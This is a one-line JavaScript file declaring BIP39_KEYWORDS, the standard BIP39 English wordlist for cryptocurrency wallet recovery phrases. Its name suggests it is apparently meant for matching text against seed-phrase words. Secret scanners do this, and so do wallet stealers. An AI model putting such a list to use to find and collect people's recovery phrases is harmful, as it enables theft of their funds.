const BIP39_KEYWORDS = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"]; 